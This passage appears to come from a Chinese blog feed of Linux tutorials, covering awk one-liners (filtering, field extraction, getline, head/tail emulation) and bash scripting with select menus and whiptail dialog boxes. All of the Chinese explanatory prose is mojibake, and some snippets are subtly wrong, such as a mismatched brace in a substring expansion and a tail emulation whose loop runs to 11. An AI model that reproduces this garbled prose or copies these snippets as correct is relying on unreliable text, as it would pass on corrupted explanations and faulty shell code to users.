function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»Ÿè®¡æ–‡ä»¶çš„è¡Œæ•°ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">' END {print NR}'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç´¯åŠ æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"1\n 2\n 3\n 4\n"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'BEGIN{num = 0 ;print "begin";} {sum += <span class="token variable">$1</span>;} END {print "=="; print sum }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä¼ é€’å¤–éƒ¨å˜é‡"><a href="#ä¼ é€’å¤–éƒ¨å˜é‡" class="headerlink" title="ä¼ é€’å¤–éƒ¨å˜é‡"></a>ä¼ é€’å¤–éƒ¨å˜é‡</h3><pre class="line-numbers language-bash"><code class="language-bash">var<span class="token operator">=</span>1000<span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print vara}'</span> vara<span class="token operator">=</span><span class="token variable">$var</span> <span class="token comment" spellcheck="true">#  è¾“å…¥æ¥è‡ªstdin</span><span class="token function">awk</span> <span class="token string">'{print vara}'</span> vara<span class="token operator">=</span><span class="token variable">$var</span> <span class="token function">file</span> <span class="token comment" spellcheck="true"># è¾“å…¥æ¥è‡ªæ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ç”¨æ ·å¼å¯¹-awk-å¤„ç†çš„è¡Œè¿›è¡Œè¿‡æ»¤"><a href="#ç”¨æ ·å¼å¯¹-awk-å¤„ç†çš„è¡Œè¿›è¡Œè¿‡æ»¤" class="headerlink" title="ç”¨æ ·å¼å¯¹ awk å¤„ç†çš„è¡Œè¿›è¡Œè¿‡æ»¤"></a>ç”¨æ ·å¼å¯¹ awk å¤„ç†çš„è¡Œè¿›è¡Œè¿‡æ»¤</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'NR &lt; 5'</span> <span class="token comment" spellcheck="true">#è¡Œå·å°äº5</span><span class="token function">awk</span> <span class="token string">'NR==1,NR==4 {print}'</span> <span class="token function">file</span> <span class="token comment" spellcheck="true">#è¡Œå·ç­‰äº1å’Œ4çš„æ‰“å°å‡ºæ¥</span><span class="token function">awk</span> <span class="token string">'/linux/'</span> <span class="token comment" spellcheck="true">#åŒ…å«linuxæ–‡æœ¬çš„è¡Œï¼ˆå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æŒ‡å®šï¼Œè¶…çº§å¼ºå¤§ï¼‰</span><span class="token function">awk</span> <span class="token string">'!/linux/'</span> <span class="token comment" spellcheck="true">#ä¸åŒ…å«linuxæ–‡æœ¬çš„è¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è®¾ç½®å®šç•Œç¬¦"><a href="#è®¾ç½®å®šç•Œç¬¦" class="headerlink" title="è®¾ç½®å®šç•Œç¬¦"></a>è®¾ç½®å®šç•Œç¬¦</h3><p>ä½¿ç”¨-F æ¥è®¾ç½®å®šç•Œç¬¦ï¼ˆé»˜è®¤ä¸ºç©ºæ ¼ï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> -F: <span class="token string">'{print <span class="token variable">$NF</span>}'</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¯»å–å‘½ä»¤è¾“å‡º"><a href="#è¯»å–å‘½ä»¤è¾“å‡º" class="headerlink" title="è¯»å–å‘½ä»¤è¾“å‡º"></a>è¯»å–å‘½ä»¤è¾“å‡º</h3><p>ä½¿ç”¨ getlineï¼Œå°†å¤–éƒ¨ shell å‘½ä»¤çš„è¾“å‡ºè¯»å…¥åˆ°å˜é‡ cmdout ä¸­ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{"grep root /etc/passwd" | getline cmdout; print cmdout }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åœ¨-awk-ä¸­ä½¿ç”¨å¾ªç¯"><a href="#åœ¨-awk-ä¸­ä½¿ç”¨å¾ªç¯" class="headerlink" title="åœ¨ awk ä¸­ä½¿ç”¨å¾ªç¯"></a>åœ¨ awk ä¸­ä½¿ç”¨å¾ªç¯</h3><pre class="line-numbers language-bash"><code class="language-bash">for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>10<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>print <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token punctuation">}</span>for<span class="token punctuation">(</span>i <span class="token keyword">in</span> array<span class="token punctuation">)</span><span class="token punctuation">{</span>print array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><p>eg:ä»¥ä¸‹å­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºå…¶ä¸­çš„æ—¶é—´ä¸²ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$echo</span> <span class="token string">'2015_04_02 20:20:08: mysqli connect failed, please check connect info'</span><span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$1</span> ":" <span class="token variable">$2</span> ":" <span class="token variable">$3</span>; }'</span><span class="token operator">></span>2015_04_02 20:20:08<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><p>è€Œå¦‚æœéœ€è¦å°†åé¢çš„éƒ¨åˆ†ä¹Ÿæ‰“å°å‡ºæ¥(æ—¶é—´éƒ¨åˆ†å’Œåæ–‡åˆ†å¼€æ‰“å°)ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$echo</span> <span class="token string">'2015_04_02 20:20:08: mysqli connect failed, please check connect info'</span><span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$1</span> ":" <span class="token variable">$2</span> ":" <span class="token variable">$3</span>; print <span class="token variable">$4</span>;}'</span><span class="token operator">></span>2015_04_02 20:20:08<span class="token operator">></span>mysqli connect failed, please check connect info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>â€‹</p><p>ä»¥é€†åºçš„å½¢å¼æ‰“å°è¡Œï¼š(tac å‘½ä»¤çš„å®ç°ï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 9<span class="token operator">|</span> \<span class="token function">awk</span> <span class="token string">'{lifo[NR] = <span class="token variable">$0</span>; lno=NR} \END{ for(;lno>-1;lno--){print lifo[lno];}} '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="awk-ç»“åˆ-grep-æ‰¾åˆ°æŒ‡å®šçš„æœåŠ¡ï¼Œç„¶åå°†å…¶-kill-æ‰"><a href="#awk-ç»“åˆ-grep-æ‰¾åˆ°æŒ‡å®šçš„æœåŠ¡ï¼Œç„¶åå°†å…¶-kill-æ‰" class="headerlink" title="awk ç»“åˆ grep æ‰¾åˆ°æŒ‡å®šçš„æœåŠ¡ï¼Œç„¶åå°†å…¶ kill æ‰"></a>awk ç»“åˆ grep æ‰¾åˆ°æŒ‡å®šçš„æœåŠ¡ï¼Œç„¶åå°†å…¶ kill æ‰</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -fe<span class="token operator">|</span> <span class="token function">grep</span> msv8 <span class="token operator">|</span> <span class="token function">grep</span> -v MFORWARD <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="awk-å®ç°-headã€tail-å‘½ä»¤"><a href="#awk-å®ç°-headã€tail-å‘½ä»¤" class="headerlink" title="awk å®ç° headã€tail å‘½ä»¤"></a>awk å®ç° headã€tail å‘½ä»¤</h3><p>head</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'NR&lt;=10{print}'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>tail</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'{buffer[NR%10] = <span class="token variable">$0</span>;} END{for(i=0;i&lt;11;i++){ \print buffer[i %10]} } '</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="æ‰“å°æŒ‡å®šåˆ—"><a href="#æ‰“å°æŒ‡å®šåˆ—" class="headerlink" title="æ‰“å°æŒ‡å®šåˆ—"></a>æ‰“å°æŒ‡å®šåˆ—</h3><p>awk æ–¹å¼å®ç°</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$6</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>cut æ–¹å¼å®ç°</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">cut</span> -f6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="æ‰“å°æŒ‡å®šæ–‡æœ¬åŒºåŸŸ"><a href="#æ‰“å°æŒ‡å®šæ–‡æœ¬åŒºåŸŸ" class="headerlink" title="æ‰“å°æŒ‡å®šæ–‡æœ¬åŒºåŸŸ"></a>æ‰“å°æŒ‡å®šæ–‡æœ¬åŒºåŸŸ</h3><p>ç¡®å®šè¡Œå·</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 100 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'NR==4,NR==6{print}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¡®å®šæ–‡æœ¬ï¼Œæ‰“å°å¤„äº start_pattern å’Œ end_pattern ä¹‹é—´çš„æ–‡æœ¬ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'/start_pattern/, /end_pattern/'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="awk-å¸¸ç”¨å†…å»ºå‡½æ•°"><a href="#awk-å¸¸ç”¨å†…å»ºå‡½æ•°" class="headerlink" title="awk å¸¸ç”¨å†…å»ºå‡½æ•°"></a>awk å¸¸ç”¨å†…å»ºå‡½æ•°</h3><ul><li>index(string,search_string)ï¼šè¿”å› search_string åœ¨ string ä¸­å‡ºç°çš„ä½ç½®</li><li>sub(regex,replacement_str,string)ï¼šå°†æ­£åˆ™åŒ¹é…åˆ°çš„ç¬¬ä¸€å¤„å†…å®¹æ›¿æ¢ä¸º replacement_str;</li><li>match(regex,string)ï¼šæ£€æŸ¥æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¦èƒ½å¤ŸåŒ¹é…å­—ç¬¦ä¸²ï¼›</li><li>length(string)ï¼šè¿”å›å­—ç¬¦ä¸²é•¿åº¦</li></ul><p>â€‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{"grep root /etc/passwd" | getline cmdout; print length(cmdout) }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>printf ç±»ä¼¼ c è¯­è¨€ä¸­çš„ printfï¼Œå¯¹è¾“å‡ºè¿›è¡Œæ ¼å¼åŒ–ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 10 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{printf "->%4s\n", <span class="token variable">$1</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="åäºŒã€è¿­ä»£æ–‡ä»¶ä¸­çš„è¡Œã€å•è¯å’Œå­—ç¬¦"><a href="#åäºŒã€è¿­ä»£æ–‡ä»¶ä¸­çš„è¡Œã€å•è¯å’Œå­—ç¬¦" class="headerlink" title="åäºŒã€è¿­ä»£æ–‡ä»¶ä¸­çš„è¡Œã€å•è¯å’Œå­—ç¬¦"></a>åäºŒã€è¿­ä»£æ–‡ä»¶ä¸­çš„è¡Œã€å•è¯å’Œå­—ç¬¦</h2><h3 id="è¿­ä»£æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œ"><a href="#è¿­ä»£æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œ" class="headerlink" title="è¿­ä»£æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œ"></a>è¿­ä»£æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œ</h3><p>while å¾ªç¯æ³•</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> file.txtæ”¹æˆå­shell:<span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token punctuation">(</span>while <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span>done<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>awk æ³•</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¿­ä»£ä¸€è¡Œä¸­çš„æ¯ä¸€ä¸ªå•è¯"><a href="#è¿­ä»£ä¸€è¡Œä¸­çš„æ¯ä¸€ä¸ªå•è¯" class="headerlink" title="è¿­ä»£ä¸€è¡Œä¸­çš„æ¯ä¸€ä¸ªå•è¯"></a>è¿­ä»£ä¸€è¡Œä¸­çš„æ¯ä¸€ä¸ªå•è¯</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">for</span> word <span class="token keyword">in</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">echo</span> <span class="token variable">$word</span><span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿­ä»£æ¯ä¸€ä¸ªå­—ç¬¦"><a href="#è¿­ä»£æ¯ä¸€ä¸ªå­—ç¬¦" class="headerlink" title="è¿­ä»£æ¯ä¸€ä¸ªå­—ç¬¦"></a>è¿­ä»£æ¯ä¸€ä¸ªå­—ç¬¦</h3><p><code>${string:start_pos:num_of_chars}</code>ï¼šä»å­—ç¬¦ä¸²ä¸­æå–ä¸€ä¸ªå­—ç¬¦ï¼›(bash æ–‡æœ¬åˆ‡ç‰‡ï¼‰<br><code>${#word}</code>ï¼šè¿”å›å˜é‡ word çš„é•¿åº¦</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">for</span><span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>${#word}<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token keyword">echo</span> $<span class="token punctuation">{</span>word:i:1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ ASCII å­—ç¬¦æ˜¾ç¤ºæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$od</span> -c filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash Shellè„šæœ¬ç¼–å†™æŠ€å·§</title>
      <link href="/post/5580e2ac.html"/>
      <url>/post/5580e2ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="Bash-Shell-è„šæœ¬ç¼–å†™æŠ€å·§"><a href="#Bash-Shell-è„šæœ¬ç¼–å†™æŠ€å·§" class="headerlink" title="Bash Shell è„šæœ¬ç¼–å†™æŠ€å·§"></a>Bash Shell è„šæœ¬ç¼–å†™æŠ€å·§</h1><h2 id="ä¸€ã€æ–‡æ¡£å‚è€ƒ"><a href="#ä¸€ã€æ–‡æ¡£å‚è€ƒ" class="headerlink" title="ä¸€ã€æ–‡æ¡£å‚è€ƒ"></a>ä¸€ã€æ–‡æ¡£å‚è€ƒ</h2><ul><li><a href="https://www.bookstack.cn/read/google-shell-style/0.md">ã€ŠGoogle Shell é£æ ¼æŒ‡å—ã€‹</a></li><li><a href="https://linuxstory.gitbook.io/advanced-bash-scripting-guide-in-chinese/">ã€Šé«˜çº§ Bash è„šæœ¬ç¼–ç¨‹æŒ‡å—ã€‹</a></li><li><a href="https://mp.weixin.qq.com/s/s5oXfeOODthA_Nl3p__bZQ">ã€ŠæŠ€èƒ½ç¯‡ï¼šshell æ•™ç¨‹åŠè„šæœ¬ç¼–å†™ã€‹</a></li><li><a href="https://hellolinux.readthedocs.io/zh_CN/latest/06_echo_color_font.html">ã€Šecho è¾“å‡ºå¸¦é¢œè‰²çš„å­—ä½“ã€‹</a></li><li>â€‹<a href="https://www.runoob.com/linux/linux-shell-basic-operators.html">ã€ŠShell åŸºæœ¬è¿ç®—ç¬¦ã€‹</a></li></ul><p>â€‹</p><h2 id="äºŒã€èœå•é€‰æ‹©"><a href="#äºŒã€èœå•é€‰æ‹©" class="headerlink" title="äºŒã€èœå•é€‰æ‹©"></a>äºŒã€èœå•é€‰æ‹©</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>SECENEKLER<span class="token operator">=</span><span class="token string">"A B C"</span><span class="token keyword">select</span> i <span class="token keyword">in</span> <span class="token variable">$SECENEKLER</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"C"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">exit</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"B"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> <span class="token string">"å¸®åŠ©èœå•"</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">df</span> -h    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string">"ä¸æ˜ç™½ï¼Ÿ"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€Whiptail-äº¤äº’å¼"><a href="#ä¸‰ã€Whiptail-äº¤äº’å¼" class="headerlink" title="ä¸‰ã€Whiptail äº¤äº’å¼"></a>ä¸‰ã€Whiptail äº¤äº’å¼</h2><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;message box title>"</span> --msgbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="åˆ›å»ºæ¶ˆæ¯æ¡†"><a href="#åˆ›å»ºæ¶ˆæ¯æ¡†" class="headerlink" title="åˆ›å»ºæ¶ˆæ¯æ¡†"></a>åˆ›å»ºæ¶ˆæ¯æ¡†</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>whiptail --title <span class="token string">"Test Message Box"</span> --msgbox <span class="token string">"Create a message box with whiptail. Choose Ok to continue."</span> 10 60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163622406-6018f3b9-555c-4844-a660-6409b2e475a2.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=510&amp;id=u0dde12f9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=510&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=241782&amp;status=done&amp;style=none&amp;taskId=u0c0a6c7e-e23f-413e-8c77-3b0bea38e2a&amp;width=737" alt="image.png"></p><h3 id="åˆ›å»º-yes-no-å¯¹è¯æ¡†"><a href="#åˆ›å»º-yes-no-å¯¹è¯æ¡†" class="headerlink" title="åˆ›å»º yes/no å¯¹è¯æ¡†"></a>åˆ›å»º yes/no å¯¹è¯æ¡†</h3><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;dialog box title>"</span> --yesno <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">(</span>whiptail --title <span class="token string">"Test Yes/No Box"</span> --yesno <span class="token string">"Choose between Yes and No."</span> 10 60<span class="token punctuation">)</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Yes. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose No. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163670077-2477eba4-eeba-410a-b0eb-6a1c85f76f82.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=509&amp;id=ua0ead1b7&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=237693&amp;status=done&amp;style=none&amp;taskId=u9bf1e3d3-e751-4c80-bb0d-814aa31e8ef&amp;width=737" alt="image.png"></p><p>ä½¿ç”¨â€œâ€“yes-buttonâ€ã€â€œâ€“no-buttonâ€é€‰é¡¹è‡ªå®šä¹‰ç¡®è®¤é€‰é¡¹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">(</span>whiptail --title <span class="token string">"Test Yes/No Box"</span> --yes-button <span class="token string">"Skittles"</span> --no-button <span class="token string">"M&amp;M's"</span>  --yesno <span class="token string">"Which do you like better?"</span> 10 60<span class="token punctuation">)</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Skittles Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose M&amp;M's. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163704245-5d15dbcc-c155-4ea7-9cee-7ef78d5bf328.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=507&amp;id=u34697dbe&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=507&amp;originWidth=735&amp;originalType=binary%E2%88%B6=1&amp;size=143991&amp;status=done&amp;style=none&amp;taskId=u10e049f8-51a7-42b8-b247-9f81a8a4155&amp;width=735" alt="image.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªè¡¨å•è¾“å…¥æ¡†"><a href="#åˆ›å»ºä¸€ä¸ªè¡¨å•è¾“å…¥æ¡†" class="headerlink" title="åˆ›å»ºä¸€ä¸ªè¡¨å•è¾“å…¥æ¡†"></a>åˆ›å»ºä¸€ä¸ªè¡¨å•è¾“å…¥æ¡†</h3><p>å¦‚æœä½ æƒ³ç”¨æˆ·è¾“å…¥ä»»æ„çš„æ–‡æœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¾“å…¥æ¡†<br>â€‹</p><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;input box title>"</span> --inputbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>default-text<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>PET<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Free-form Input Box"</span> --inputbox <span class="token string">"What is your pet's name?"</span> 10 60 Wigglebutt 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your pet name is:"</span> <span class="token variable">$PET</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163752741-5962032e-7603-435b-9876-2aead1ee3a44.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=512&amp;id=uc0b4a5f2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=738&amp;originalType=binary%E2%88%B6=1&amp;size=168127&amp;status=done&amp;style=none&amp;taskId=u6ea72af4-5823-4d62-bec1-1b786a0c5dd&amp;width=738" alt="image.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªå¯†ç æ¡†"><a href="#åˆ›å»ºä¸€ä¸ªå¯†ç æ¡†" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå¯†ç æ¡†"></a>åˆ›å»ºä¸€ä¸ªå¯†ç æ¡†</h3><p>å½“ç”¨æˆ·éœ€è¦è¾“å…¥æ•æ„Ÿä¿¡æ¯æ—¶ä½¿ç”¨å¯†ç æ¡†<br>â€‹</p><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;password box title>"</span> --passwordbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>PASSWORD<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Password Box"</span> --passwordbox <span class="token string">"Enter your password and choose Ok to continue."</span> 10 60 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your password is:"</span> <span class="token variable">$PASSWORD</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" 